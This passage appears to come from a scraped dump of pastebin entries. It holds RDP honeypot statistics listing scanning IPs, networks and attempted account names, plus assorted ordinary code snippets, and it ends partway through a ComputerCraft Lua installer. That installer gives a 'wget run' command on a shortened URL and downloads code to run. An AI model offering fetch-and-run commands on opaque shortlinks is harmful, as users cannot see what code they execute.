    ""Ohio"": 118,
    ""Zhejiang"": 54,
    ""Shandong"": 2,
    ""Sao Paulo"": 80,
    ""Virginia"": 182,
    ""Tehran"": 66,
    ""Bangkok"": 6,
    ""Punjab"": 38,
    ""Sofia-Capital"": 68,
    ""Xinjiang Uyghur Autonomous Region"": 56,
    ""England"": 4,
    ""Illinois"": 22,
    ""Gansu"": 86,
    ""Jiangsu"": 48,
    ""New Jersey"": 6,
    ""Quebec"": 14,
    ""Beijing"": 38,
    ""Hanoi"": 10,
    ""North Holland"": 384,
    ""Hesse"": 2,
    ""Maharashtra"": 4,
    ""Kyiv City"": 18,
    ""St.-Petersburg"": 4,
    ""North West"": 6,
    ""Seoul"": 4,
    ""Andalusia"": 6,
    ""Ho Chi Minh"": 78,
    ""Guangdong"": 22,
    ""Shanghai"": 4,
    ""Gaza"": 2,
    ""Provincia de Panama"": 2,
    ""Drenthe"": 4,
    ""Lombardy"": 10,
    ""Tamil Nadu"": 20,
    ""English River"": 2,
    ""Moscow"": 44,
    ""Haryana"": 20,
    ""California"": 12,
    ""Texas"": 2,
    ""Parana"": 2
  },
  ""country"": {
    ""United States"": 342,
    ""China"": 310,
    ""Brazil"": 82,
    ""Iran"": 66,
    ""Thailand"": 6,
    ""Pakistan"": 38,
    ""Bulgaria"": 68,
    ""United Kingdom"": 4,
    ""Canada"": 14,
    ""Vietnam"": 88,
    ""Netherlands"": 388,
    ""Germany"": 2,
    ""India"": 44,
    ""Ukraine"": 18,
    ""Russia"": 48,
    ""Singapore"": 6,
    ""South Korea"": 4,
    ""Spain"": 6,
    ""Palestine"": 2,
    ""Panama"": 2,
    ""Italy"": 10,
    ""Seychelles"": 2
  },
  ""account"": {
    ""142.93.8.59"": 772,
    ""hello"": 660,
    ""Test"": 12,
    ""Administr"": 42,
    ""(empty)"": 8,
    ""Domain"": 40,
    ""dMQHVKwEQ"": 2,
    ""DPQCgs"": 2,
    ""CaUHRf"": 2,
    ""nmap"": 2,
    ""pyxfyu6y"": 2,
    ""rCwIpCgaP"": 2,
    ""TGqZrW"": 2,
    ""cWfaIB"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1550
  },
  ""client_build"": {
    ""Unknown"": 1550
  },
  ""client_name"": {
    ""Unknown"": 1550
  },
  ""ip_type"": {
    ""Unknown"": 810,
    ""hosting"": 230,
    ""mobile"": 474,
    ""hosting & proxy"": 16,
    ""proxy"": 20
  }
}"
szdBCWMq,2023-07-04_stats.json,rdp_snitch,JSON,Tuesday 4th of July 2023 07:15:08 PM CDT,"{
  ""ip"": {
    ""69.58.124.234"": 59,
    ""36.108.169.132"": 27,
    ""120.27.12.65"": 1,
    ""150.230.79.119"": 22,
    ""92.204.139.79"": 42,
    ""185.66.228.185"": 26,
    ""167.94.112.148"": 3,
    ""20.42.101.211"": 49,
    ""110.39.186.237"": 19,
    ""46.10.214.186"": 34,
    ""120.71.0.5"": 28,
    ""51.75.160.42"": 2,
    ""162.245.238.122"": 10,
    ""125.74.93.228"": 43,
    ""114.217.18.245"": 24,
    ""168.138.149.190"": 12,
    ""45.55.128.69"": 1,
    ""192.99.110.133"": 6,
    ""120.132.17.153"": 12,
    ""123.28.12.177"": 3,
    ""147.78.47.51"": 1,
    ""167.94.146.59"": 1,
    ""87.251.75.145"": 3,
    ""178.21.163.70"": 2,
    ""172.105.53.82"": 2,
    ""164.92.158.134"": 1,
    ""201.93.165.53"": 6,
    ""31.43.185.32"": 8,
    ""185.170.144.3"": 2,
    ""31.41.244.113"": 2,
    ""192.53.115.78"": 1,
    ""121.130.197.200"": 2,
    ""85.53.127.115"": 3,
    ""118.70.102.3"": 2,
    ""43.153.216.55"": 2,
    ""87.251.75.120"": 1,
    ""103.195.236.213"": 13,
    ""188.121.99.151"": 5,
    ""112.5.87.34"": 1,
    ""81.68.252.203"": 2,
    ""45.119.81.119"": 1,
    ""213.6.148.83"": 1,
    ""80.82.68.31"": 183,
    ""192.99.0.188"": 1,
    ""39.104.21.190"": 7,
    ""141.98.82.22"": 1,
    ""191.101.174.18"": 1,
    ""36.137.91.143"": 10,
    ""141.98.81.34"": 2,
    ""217.133.16.32"": 5,
    ""118.91.178.54"": 10,
    ""79.124.62.106"": 1,
    ""45.93.20.135"": 4,
    ""14.97.25.30"": 10,
    ""198.235.24.217"": 3,
    ""104.152.52.133"": 1,
    ""87.251.75.64"": 1,
    ""62.122.184.168"": 4,
    ""62.122.184.166"": 4,
    ""87.251.64.110"": 2,
    ""74.124.24.238"": 1,
    ""43.239.223.100"": 25,
    ""62.122.184.165"": 2,
    ""201.22.58.119"": 1,
    ""91.240.118.133"": 4,
    ""191.101.174.13"": 1,
    ""152.89.198.133"": 2,
    ""198.235.24.249"": 3,
    ""185.156.72.30"": 1
  },
  ""asn"": {
    ""AS32899"": 59,
    ""AS137695"": 55,
    ""AS37963"": 8,
    ""AS31898"": 34,
    ""AS398108"": 42,
    ""AS201689"": 26,
    ""AS148997"": 3,
    ""AS8075"": 49,
    ""AS38264"": 19,
    ""AS8866"": 34,
    ""AS16276"": 9,
    ""AS27323"": 10,
    ""AS141998"": 43,
    ""AS4134"": 24,
    ""AS14061"": 2,
    ""AS140292"": 12,
    ""AS45899"": 3,
    ""AS209588"": 4,
    ""AS398705"": 1,
    ""AS208091"": 5,
    ""AS21419"": 2,
    ""AS63949"": 3,
    ""AS27699"": 6,
    ""AS211736"": 8,
    ""AS48080"": 4,
    ""AS57678"": 2,
    ""AS4766"": 2,
    ""AS12479"": 3,
    ""AS18403"": 2,
    ""AS132203"": 2,
    ""AS140827"": 13,
    ""AS202468"": 5,
    ""AS9808"": 11,
    ""AS45090"": 2,
    ""AS131386"": 1,
    ""AS12975"": 1,
    ""AS202425"": 183,
    ""AS32780"": 2,
    ""AS8612"": 5,
    ""AS18002"": 10,
    ""AS207812"": 1,
    ""AS57523"": 20,
    ""AS45820"": 10,
    ""AS396982"": 6,
    ""AS14987"": 1,
    ""AS13354"": 1,
    ""AS135942"": 25,
    ""AS18881"": 1,
    ""AS61432"": 1
  },
  ""isp"": {
    ""Bresco Broadband"": 59,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 55,
    ""Addresses CNNIC"": 13,
    ""Oracle Corporation"": 34,
    ""GoDaddy.com, LLC"": 42,
    ""Lamerd Information & Communication Technology Co., ltd"": 26,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 3,
    ""Microsoft Corporation"": 49,
    ""Wateen Telecom Limited"": 19,
    ""Vivacom Bulgaria EAD"": 34,
    ""OVH SAS"": 9,
    ""Wowrack.com"": 10,
    ""China Telecom"": 43,
    ""Chinanet"": 24,
    ""DigitalOcean, LLC"": 2,
    ""VietNam Post and Telecom Corporation"": 3,
    ""Flyservers S.A."": 4,
    ""Censys, Inc."": 1,
    ""XHOST-INTERNET-SOLUTIONS"": 5,
    ""Pishtaze E Jadid Infomration Company"": 2,
    ""Akamai Technologies"": 2,
    ""Vivo"": 7,
    ""FOP Dmytro Nedilskyi"": 8,
    ""Dmitriy Panchenko"": 4,
    ""Cat Technologies Co. Limited"": 2,
    ""Akamai Technologies, Inc."": 1,
    ""Korea Telecom"": 2,
    ""Uni2 1"": 3,
    ""FPT Telecom Company"": 2,
    ""Aceville Pte.ltd"": 2,
    ""AZ Viet NAM Communications Technology Company Limited"": 13,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 5,
    ""China Mobile"": 11,
    ""EuroNet Internet"": 2,
    ""Long Van System Solution"": 1,
    ""Palestine Telecommunications Company"": 1,
    ""IP Volume inc"": 183,
    ""Hangzhou Alibaba Advertising Co"": 7,
    ""Hosting Services"": 2,
    ""Tiscali Italia SpA"": 5,
    ""WORLDPHONE"": 10,
    ""DM AUTO EOOD"": 1,
    ""Chang Way Technologies Co. Limited"": 20,
    ""Ttsl-isp Division"": 10,
    ""Google LLC"": 6,
    ""Rethem Hosting LLC"": 1,
    ""zColo"": 1,
    ""VCIC"": 25,
    ""TOV VAIZ PARTNER"": 1
  },
  ""org"": {
    ""Bresco Broadband"": 59,
    ""Chinanet ZJ"": 27,
    ""Aliyun Computing Co., LTD"": 8,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 34,
    ""Unknown"": 98,
    ""KTB COMPUTER SERVICES COMPANY LIMITED"": 3,
    ""Microsoft Azure Cloud (eastus)"": 49,
    ""Wateen Telecom Limited"": 19,
    ""Bulgarian Telecommunications Company Plc"": 34,
    ""Chinanet XJ"": 28,
    ""OVH Ltd"": 2,
    ""Wowrack.com"": 10,
    ""Chinanet GS"": 43,
    ""Chinanet JS"": 24,
    ""Digital Ocean"": 1,
    ""AVAST Software"": 6,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Flyservers S.A"": 3,
    ""Censys, Inc."": 1,
    ""Xhost Internet Solutions"": 7,
    ""Linode"": 2,
    ""DigitalOcean, LLC"": 1,
    ""TELEF\ufffdNICA BRASIL S.A"": 7,
    ""FOP Dmytro Nedilskyi"": 8,
    ""Xhostis"": 2,
    ""Red Bytes LLC"": 2,
    ""Linode, LLC"": 1,
    ""Kornet"": 2,
    ""Vietnam Internet Network Information Center"": 2,
    ""DULIEUAZ"": 13,
    ""Noyan Abr Arvan Co. ( Private Joint Stock)"": 5,
    ""China Mobile Communications Corporation"": 11,
    ""Euronet Internet BV"": 2,
    ""Palestine Telecommunications Company"": 1,
    ""IP Volume inc"": 183,
    ""OVH Hosting, Inc."": 1,
    ""Vdsline"": 1,
    ""Express Technologies Ltd"": 2,
    ""Tiscali SpA"": 5,
    ""Internet Solutions & Innovations LTD"": 1,
    ""Starcrecium Limited"": 6,
    ""Tata Teleservices LTD Cdma"": 10,
    ""Palo Alto Networks, Inc"": 6,
    ""Rethem Hosting LLC"": 1,
    ""Chang Way Technologies Co. Limited"": 14,
    ""zColo"": 1,
    ""KDATA Company Limited"": 25,
    ""TOV VAIZ PARTNER"": 1
  },
  ""regionName"": {
    ""Ohio"": 59,
    ""Zhejiang"": 27,
    ""Shandong"": 1,
    ""Sao Paulo"": 40,
    ""Virginia"": 91,
    ""Tehran"": 33,
    ""Bangkok"": 3,
    ""Punjab"": 19,
    ""Sofia-Capital"": 34,
    ""Xinjiang Uyghur Autonomous Region"": 28,
    ""England"": 2,
    ""Illinois"": 11,
    ""Gansu"": 43,
    ""Jiangsu"": 24,
    ""New Jersey"": 3,
    ""Quebec"": 7,
    ""Beijing"": 19,
    ""Hanoi"": 5,
    ""North Holland"": 192,
    ""Hesse"": 1,
    ""Maharashtra"": 2,
    ""Kyiv City"": 9,
    ""St.-Petersburg"": 2,
    ""North West"": 3,
    ""Seoul"": 2,
    ""Andalusia"": 3,
    ""Ho Chi Minh"": 39,
    ""Guangdong"": 11,
    ""Shanghai"": 2,
    ""Gaza"": 1,
    ""Provincia de Panama"": 1,
    ""Drenthe"": 2,
    ""Lombardy"": 5,
    ""Tamil Nadu"": 10,
    ""English River"": 1,
    ""Moscow"": 22,
    ""Haryana"": 10,
    ""California"": 6,
    ""Texas"": 1,
    ""Parana"": 1
  },
  ""country"": {
    ""United States"": 171,
    ""China"": 155,
    ""Brazil"": 41,
    ""Iran"": 33,
    ""Thailand"": 3,
    ""Pakistan"": 19,
    ""Bulgaria"": 34,
    ""United Kingdom"": 2,
    ""Canada"": 7,
    ""Vietnam"": 44,
    ""Netherlands"": 194,
    ""Germany"": 1,
    ""India"": 22,
    ""Ukraine"": 9,
    ""Russia"": 24,
    ""Singapore"": 3,
    ""South Korea"": 2,
    ""Spain"": 3,
    ""Palestine"": 1,
    ""Panama"": 1,
    ""Italy"": 5,
    ""Seychelles"": 1
  },
  ""account"": {
    ""142.93.8.59"": 386,
    ""hello"": 330,
    ""Test"": 6,
    ""Administr"": 21,
    ""(empty)"": 4,
    ""Domain"": 20,
    ""dMQHVKwEQ"": 1,
    ""DPQCgs"": 1,
    ""CaUHRf"": 1,
    ""nmap"": 1,
    ""pyxfyu6y"": 1,
    ""rCwIpCgaP"": 1,
    ""TGqZrW"": 1,
    ""cWfaIB"": 1
  },
  ""keyboard"": {
    ""Unknown"": 775
  },
  ""client_build"": {
    ""Unknown"": 775
  },
  ""client_name"": {
    ""Unknown"": 775
  },
  ""ip_type"": {
    ""Unknown"": 405,
    ""hosting"": 115,
    ""mobile"": 237,
    ""hosting & proxy"": 8,
    ""proxy"": 10
  }
}"
BrA1huAW,HTTP Request with HUD,XeroXipher2022,LScript,Tuesday 4th of July 2023 06:55:58 PM CDT,"/* As of now I have made a Google Sheets with all of the Data I want to incorporate into my game... It is far from ready but I wanted to test out Google Sheets by giving myself a Beginner Starting Pack / HUD... Unfortunately I don't know where to HTTP_METHOD ""GET"" and ""RESPONSE, the following code, aside from my Sheet URL is from what I researched in the Forums.*/

string sheetID = ""18HslQMEJ76qjuPmXg9mjKpL3780_lbjhe3pfk1eeWsIE"";
string sheetURL = ""https://docs.google.com/spreadsheets/d/1dTWPi4uHodkcwX1qjdT1ib8M-QJbYjrPOuPaGqfpPkU/edit#gid=0"";
key selfCheckRequestId;

default
{
    state_entry()
    {       
    }
    touch_start(integer total_number)
    {  selfCheckRequestId =
        llHTTPRequest( sheetURL,
        [HTTP_METHOD, ""GET"",
        HTTP_VERBOSE_THROTTLE, FALSE,
        HTTP_BODY_MAXLENGTH, 16384],
        """");      
    }   
    http_response(key id, integer status, list metaData, string body)
    {     
        if (id == selfCheckRequestId)
        {       string marker =  ""@!@""; 
                integer start = llSubStringIndex(body,marker);        
                integer end = llSubStringIndex(body, ""</td>"");     
                string fetch =   llGetSubString(body,start + llStringLength(marker), end-1);             
                llOwnerSay(""\n response: \n"" + fetch);\
               
        }       
    } 
}
"
kSWCXGyR,Client Class,SoSaymon,Python,Tuesday 4th of July 2023 06:44:17 PM CDT,"import re


class Client:
    """"""
    Client model

    Attributes:
        :param name: str - client name
        :param street: str - client street
        :param city: str - client city
        :param postal_code: str - client postal code
        :param phone: str - client phone number
        :param email: str - client email address
        :param nip: str - client NIP number

    Methods:
        :__init__: initialize Client object
        :__str__: return string representation of Client object
    """"""

    def __init__(self, name: str, street: str, city: str, postal_code: str, phone: str, email: str, nip: str = '') -> None:
        self.name = name
        self.street = street
        self.city = city
        self.postal_code = postal_code
        self.phone = phone
        self.email = email
        self.nip = nip

        if not self.validate():
            if not self.validate_nip():
                raise ValueError('Invalid NIP number')
            if not self.validate_email():
                raise ValueError('Invalid email address')
            if not self.validate_phone():
                raise ValueError('Invalid phone number')

    def __str__(self) -> str:
        return f'{self.name}, {self.street}, {self.city}, {self.postal_code}, {self.phone}, {self.email}, {self.nip}'

    def validate_nip(self) -> bool:
        """"""
        Validate NIP number
        :return: bool - True if NIP number is valid, False otherwise
        """"""
        nip = self.nip.replace('-', '')
        if len(nip) != 10:
            return False
        weights = [6, 5, 7, 2, 3, 4, 5, 6, 7]
        check_sum = sum([int(nip[i]) * weights[i] for i in range(len(weights))])
        return check_sum % 11 == int(nip[-1])

    def validate_email(self) -> bool:
        """"""
        Validate email address
        :return: bool - True if email address is valid, False otherwise
        """"""
        return bool(re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', self.email))

    def validate_phone(self) -> bool:
        """"""
        Validate phone number
        :return: bool - True if phone number is valid, False otherwise
        """"""
        self.phone = self.phone.replace(' ', '')
        self.phone = self.phone.replace('-', '')
        is_valid = bool(re.match(r'^\+?1?\d{9,15}$', self.phone))

        return is_valid

    def validate_postal_code(self) -> bool:
        """"""
        Validate postal code
        :return: bool - True if postal code is valid, False otherwise
        """"""
        self.postal_code = self.postal_code.replace(' ', '')
        self.postal_code = self.postal_code.replace('-', '')
        is_valid = bool(re.match(r'^\d{2}\d{3}$', self.postal_code))

        return is_valid

    def validate(self) -> bool:
        """"""
        Validate client
        :return: bool - True if client is valid, False otherwise
        """"""
        return self.validate_nip() and self.validate_email() and self.validate_phone() and self.validate_postal_code()
"
gqMY8ZsF,Seller Class,SoSaymon,Python,Tuesday 4th of July 2023 06:43:03 PM CDT,"from src.invoice_generator.models.client import Client


class Seller(Client):
    """"""
    Seller model

    Attributes:
        :param name: str - seller name
        :param street: str - seller street
        :param city: str - seller city
        :param postal_code: str - seller postal code
        :param phone: str - seller phone number
        :param email: str - seller email address
        :param nip: str - seller NIP number
        :param regon: str - seller REGON number
        :param bank_account: str - seller bank account number

    Methods:
        :__init__: initialize Seller object
        :__str__: return string representation of Seller object
    """"""

    def __init__(self, name: str, street: str, city: str, postal_code: str, phone: str, email: str, nip: str, regon: str, bank_account: str) -> None:
        super().__init__(name, street, city, postal_code, phone, email, nip)
        self.regon = regon
        self.bank_account = bank_account

        if not self.validate():
            if not self.validate_regon():
                raise ValueError('Invalid REGON number')
            if not self.validate_bank_account():
                raise ValueError('Invalid bank account number')

    def __str__(self) -> str:
        return f'super().__str__(), {self.regon}, {self.bank_account}'

    def validate(self) -> bool:
        """"""
        Validate Seller object
        :return: bool - True if Seller object is valid, False otherwise
        """"""
        return super().validate() and self.validate_regon() and self.validate_bank_account()

    def validate_regon(self) -> bool:
        """"""
        Validate REGON number
        :return: bool - True if REGON number is valid, False otherwise
        """"""
        regon = self.regon.replace('-', '')
        if len(regon) != 9:
            return False
        weights = [8, 9, 2, 3, 4, 5, 6, 7]
        check_sum = sum([int(regon[i]) * weights[i] for i in range(len(weights))])
        return check_sum % 11 == int(regon[-1])

    def validate_bank_account(self) -> bool:
        """"""
        Validate bank account number
        :return: bool - True if bank account number is valid, False otherwise
        """"""
        bank_account = self.bank_account.replace('-', '')
        if len(bank_account) != 26:
            return False
        weights = [1, 10, 3, 30, 9, 90, 27, 76, 81, 34, 49, 5, 50, 15, 53, 45, 62, 38, 89, 17, 73, 51, 25, 56, 75, 71]
        check_sum = sum([int(bank_account[i]) * weights[i] for i in range(len(weights))])
        return check_sum % 97 == 1
"
wR7gdNaT,Unsigned Numbers Kotlin,hhac,Java,Tuesday 4th of July 2023 06:31:41 PM CDT,"// Online Java Compiler
// Use this editor to write, compile and run your Java code online

class UnsignedNumbers {
    public static void main(String[] args) {
        System.out.println(""Hello, World!"");
        
        int i = -2094967296;
        
        System.out.println(i);
        System.out.println(Integer.toUnsignedString(i));
        
        // two unsigned ints
        int i1 = (int) 2200000000L;
        int i2 = 55555;
        
        int sum  = i1 + i2;  // 2200055555
        int diff = i1 - i2;  // 2199944445
        int prod = i2 * i2;  // 3086358025
        
        System.out.println(""Sum: "" + sum);
        System.out.println(""diff: "" + diff);
        System.out.println(""prod: "" + prod);
        
        System.out.println(""Sum: "" + Integer.toUnsignedString(sum));
        System.out.println(""diff: "" + Integer.toUnsignedString(diff));
        System.out.println(""prod: "" + Integer.toUnsignedString(prod));
        
        int q = Integer.divideUnsigned(i1, i2);
        int r = Integer.remainderUnsigned(i1, i2);

        System.out.println(""q: "" + q); // 39600
        System.out.println(""r: "" + r); // 22000
    }
}"
vy3LtMgQ,25. Diablo,elirosecodes,HTML,Tuesday 4th of July 2023 05:40:07 PM CDT,"<link href=""https://dl.dropboxusercontent.com/s/4hiumzyrbfzvp1h/diablo.css"" rel=""stylesheet""><link rel=""stylesheet"" href=""//icons.cappuccicons.com/cpf.css""><div class=""diablo""><div class=""dlb-01""><div class=""dlb-01lg"">bury me</div><div class=""dlb-01mn""><a href=""/"">profile</a><a href=""/"">id</a><a href=""/"">baul</a><a href=""/"">outfit</a></div></div><div class=""dlb-02""><div class=""dlb-02tl""><span>church</span> outfit</div><div class=""dlb-02stl"">this is the dress I want to be buried in</div></div><div class=""dlb-03"">
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Mauris posuere urna justo, a pretium arcu imperdiet eu. Nullam mattis iaculis ipsum vel dignissim. Aenean quis pellentesque lectus. Praesent pretium quam vitae dui eleifend bibendum. Vivamus pharetra finibus lorem eget interdum. Praesent sit amet vulputate elit. Integer leo massa, accumsan nec suscipit sit amet, eleifend ac urna. Curabitur gravida feugiat nunc, eget volutpat arcu viverra id.

Cras semper, mi non porta pretium, libero lorem ultricies nunc, id auctor dolor nunc et metus. Integer egestas dapibus dui vitae dictum. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Nullam ligula justo, gravida sit amet tristique ac, tempus a orci. Vestibulum sed interdum neque, quis sollicitudin orci. Curabitur quis ipsum auctor, maximus velit ac, tristique mi. In eu elementum nunc, vel semper ante. Nam at ex ligula.

Aliquam erat volutpat. Integer molestie quis mi in rutrum. Fusce et egestas nunc, eget aliquet neque. Mauris non tempor nunc, nec interdum purus. Pellentesque lacus mauris, euismod consequat massa placerat, consequat molestie orci. Nunc blandit et nisi sit amet auctor. Phasellus ac felis cursus, vulputate neque eu, porttitor est. Nunc non erat id neque posuere interdum in id libero. Aliquam id tempus arcu.
</div><div class=""dlb-04""><i class=""cp cp-broken-heart-o""></i></div><div class=""dlb-05"">Leave the rings<br>I might need them<br>Unholy water<br>take a sip</div></div><a href=""https://elirosecodes.tumblr.com/""><div class=""gnomo"">elirose</div></a><style>:root{--dlb: #84A59D;}</style>"
KmxwUEw0,Untitled,dompana,C++,Tuesday 4th of July 2023 05:10:26 PM CDT,"#include <iostream>
#include <string>
#include <list>
#include <algorithm>
#include <random>

int getInput( ) ;
int random_complex() ;

int main() {
    std::string winner { ""Noone"" } ; 
    int userHand { } ;
    while ( 1 ) {
        int botHand { random_complex() };
        userHand = getInput();
            if ( userHand == -1 ) {
                break;
            }
            if (userHand == botHand ) {
                winner = ""Noone"" ;
            }
            else {
                if ( userHand == 1 && botHand == 3 ) {
                    winner = ""User"";
                }
                if ( userHand > botHand ) { //
                    winner = ""User"" ;
                }
                if ( botHand == 1 && userHand == 3 ) {
                    winner = ""Bot"";
                }
                if ( botHand > userHand ) {
                    winner = ""Bot"" ;
                }
            }
            std::cout << ""The winner is "" << winner << ""! Congratulations! "" << winner << std::endl ;
            std::list<std::string> handString { ""Rock"", ""Paper"", ""Scissor"" } ;
            auto userString { handString.begin() } ;
            std::advance( userString, userHand - 1 ) ;
            auto botString { handString.begin() } ;
            std::advance( botString, botHand - 1 ) ; 
            std::cout << ""The users cast was "" << *userString << "" and the bots cast was "" << *botString << std::endl;
    }
    return 0;
}
int random_complex(){
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 3);
    int random = dis(gen);
    return random ;
}
int getInput( ) {
    std::cout << ""Please enter your cast! "";
    std::string userInput { };
    std::cin >> userInput;
    if ( userInput.length() == 1 ) {
        {
            std::list<char> validList { {'1', 'R', 'r'} } ;
            auto it = std::find( validList.begin(), validList.end(), userInput[0] ) ;
            if ( it != validList.end() ) {
                return 1 ;
            }
        } {
            std::list<char> validList { {'2', 'P', 'p'} } ;
            auto it = std::find(validList.begin(), validList.end(), userInput[0] ) ;
            if ( it != validList.end() ) {
                return 2 ;
            }
        } {
            std::list<char> validList { {'3', 'S', 's'} } ;
            auto it = std::find( validList.begin(), validList.end(), userInput[0] ) ;
            if ( it != validList.end() ) {
                return 3 ;
            }
        }
    }
    if ( userInput.length() > 1 ) {
        for (unsigned x { 0 } ; x < userInput.length() ; x++ ) {
            if ( userInput[x] < 97 ) { 
                userInput[x] = static_cast<char>( userInput[x] + 32 ) ;
            }
        }
        if ( userInput == ""rock"" ) {
            return 1 ;
        }
        if ( userInput == ""paper"" ) {
            return 2 ;
        }
        if ( userInput == ""scissor"" ) {
            return 3 ;
        }
    }
    return -1;
}"
nJ4nB5mT,bot menu error,lucas-araras,Python,Tuesday 4th of July 2023 04:42:27 PM CDT,"import json
import os
from dotenv import load_dotenv
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

from tinydb import TinyDB, Query

# Inicialização do bot e conexão com o banco de dados
db = TinyDB('products.json')
products_table = db.table('products')

load_dotenv()
key = os.getenv(""TELEGRAM_API_TOKEN"")

# Comandos do bot
def start(update, context):
    reply_markup = create_menu_keyboard()
    update.message.reply_text('Bem-vindo à Padaria Bot! Aqui está o nosso menu:', reply_markup=reply_markup)

def show_menu(update, context):
    reply_markup = create_menu_keyboard()
    update.callback_query.edit_message_text('Aqui está o nosso menu:', reply_markup=reply_markup)

def handle_menu_selection(update, context):
    query = update.callback_query
    product_id = query.data
    product = get_product(product_id)
    if product:
        message = format_product_message(product)
        query.edit_message_text(text=message)
    else:
        query.edit_message_text('Desculpe, não foi possível encontrar o produto selecionado.')

def finalize_order(update, context):
    update.callback_query.edit_message_text('Pedido finalizado. Obrigado!')

def cancel_order(update, context):
    update.callback_query.edit_message_text('Pedido cancelado. Volte sempre!')

# Funções auxiliares
def create_menu_keyboard():
    keyboard = []
    products = get_all_products()
    for product in products:
        callback_data = str(product.doc_id)
        button = InlineKeyboardButton(product['name'], callback_data=callback_data)
        keyboard.append([button])
    keyboard.append([InlineKeyboardButton('Finalizar Pedido', callback_data='finalize'),
                        InlineKeyboardButton('Cancelar Pedido', callback_data='cancel')])
    reply_markup = InlineKeyboardMarkup(keyboard)
    return reply_markup

def get_all_products():
    return products_table.all()

def get_product(product_id):
    Product = Query()
    result = products_table.search(Product.doc_id == int(product_id))
    if result:
        return result[0]
    return None

def format_product_message(product):
    message = f""Nome: {product['name']}\n""
    message += f""Preço: R${product['price']:.2f}\n""
    message += f""Descrição: {product['description']}""
    return message

# Configuração e execução do bot
def main():
    # Substitua 'TOKEN' pela chave do seu bot do Telegram
    updater = Updater(key, use_context=True)
    dispatcher = updater.dispatcher

    # Comandos do bot
    start_handler = CommandHandler('start', start)
    dispatcher.add_handler(start_handler)

    # Callbacks do bot
    menu_handler = CallbackQueryHandler(show_menu, pattern='^menu$')
    dispatcher.add_handler(menu_handler)

    menu_selection_handler = CallbackQueryHandler(handle_menu_selection)
    dispatcher.add_handler(menu_selection_handler)

    finalize_handler = CallbackQueryHandler(finalize_order, pattern='^finalize$')
    dispatcher.add_handler(finalize_handler)

    cancel_handler = CallbackQueryHandler(cancel_order, pattern='^cancel$')
    dispatcher.add_handler(cancel_handler)

    # Iniciar o bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()


# I'm using tinydb as a json database to store the products, see my database:
{
    ""products"": {
        ""1"": {
        ""name"": ""Pão francês (unidade)"",
        ""image"": ""./products/paof.jpg"",
        ""description"": ""Delicioso pão francês fresquinho."",
        ""price"": 0.75
        },
        ""2"": {
        ""name"": ""Pão doce (unidade)"",
        ""image"": ""./products/paodoce.jpg"",
        ""description"": ""Bolo de cenoura com cobertura de chocolate."",
        ""price"": 6.00
        },
        ""3"": {
        ""name"": ""Salgado frito (unidade)"",
        ""image"": ""./products/salgadof.jpg"",
        ""description"": ""Salgado frito."",
        ""price"": 6.00
        },
        ""4"": {
        ""name"": ""Salgado assado (unidade)"",
        ""image"": ""./products/salgadoassado.jpg"",
        ""description"": ""Salgado assado."",
        ""price"": 6.50
        },
        ""5"": {
        ""name"": ""Bolacha (unidade)"",
        ""image"": ""./products/bolachas.jpg"",
        ""description"": ""Bolachas."",
        ""price"": 4.00
        },
        ""6"": {
        ""name"": ""Sonho (unidade)"",
        ""image"": ""./products/sonho.jpg"",
        ""description"": ""Sonho."",
        ""price"": 5.00
        },
        ""7"": {
        ""name"": ""Pudim (unidade)"",
        ""image"": ""./products/pudim.jpg"",
        ""description"": ""Pudim."",
        ""price"": 6.50
        },
        ""8"": {
        ""name"": ""Brigadeiro (unidade)"",
        ""image"": ""./products/brigadeiro.jpg"",
        ""description"": ""Brigadeiro."",
        ""price"": 2.50
        }
    }
}

# when I run the main.py file it returns the error: Traceback (most recent call last):
   # File ""C:\Users\Lucas\OneDrive\Desktop\projects\bots\bot_menu\main.py"", line 98, in <module>
    # main()
 #  File ""C:\Users\Lucas\OneDrive\Desktop\projects\bots\bot_menu\main.py"", line 73, in main
   #  updater = Updater(key, use_context=True)
# TypeError: Updater.__init__() got an unexpected keyword argument 'use_context'

# I am using python-telegram-bot lib version 20.3
"
GZjQ9G11,Teste JS bgcolor,antonio_pedro,JavaScript,Tuesday 4th of July 2023 04:33:22 PM CDT,"document.body.style.backgroundColor = ""black"";"
fHw3q3vH,SeanwareUpdater,true_beef,Lua,Tuesday 4th of July 2023 04:29:23 PM CDT,"-- Shortened Raw Link: https://tinyurl.com/SeanWareInstaller
-- wget run https://tinyurl.com/SeanWareInstaller

term.clear()
term.setCursorPos(1, 1)
term.setTextColor(colors.orange)
print("""")
print(""~ SEANWARE Installer ~"")
print(""Checking for updates.. "")

fs.makeDir(""/Seanware/Savedata"")

local function InstallFromGit(repoFile, saveTo)
	local download = http.get(""https://github.com/TrueBeef/CCLuaProjects/raw/main/"" .. repoFile .. "".lua"") --This will make 'download' hold the contents of the file.
	if(download) then --checks if download returned true or false
		local handle = download.readAll() --Reads everything in download
		download.close() --remember to close the download!
		local file = fs.open(saveTo .. "".lua"",""w"") --opens the file defined in 'saveTo' with the permissions to write.
		file.write(handle) --writes all the stuff in handle to the file defined in 'saveTo'
		file.close() --remember to close the file!
		term.setTextColor(colors.green)
		print(""Installed file: "" .. repoFile)
		else --if returned false
		term.setTextColor(colors.red)
		print(""Unable to download the file "".. repoFile)
		print(""Make sure you have the HTTP API enabled or"")
		print(""an internet connection!"")
	end --end the if
end --close the function

local function InstallAdditionalModules()
	term.setTextColor(colors.white)
	print(""Install others? (y/n)"")
	installMore = read()

	if(installMore == ""y"") then
		term.clear()
		term.setCursorPos(1,1)
		term.setTextColor(colors.orange)
		term.write(""~ SEANWARE Installer ~"")
		term.setTextColor(colors.white)
		term.setCursorPos(1,2)				
		term.write(""Filename in CCLuaProjectsRepo:"")
		term.setCursorPos(1,3)
		local repoFile = read()

		term.clear()
		term.setCursorPos(1,1)
		term.write(""Selected Filename: "" .. repoFile)
		term.setCursorPos(1,2)
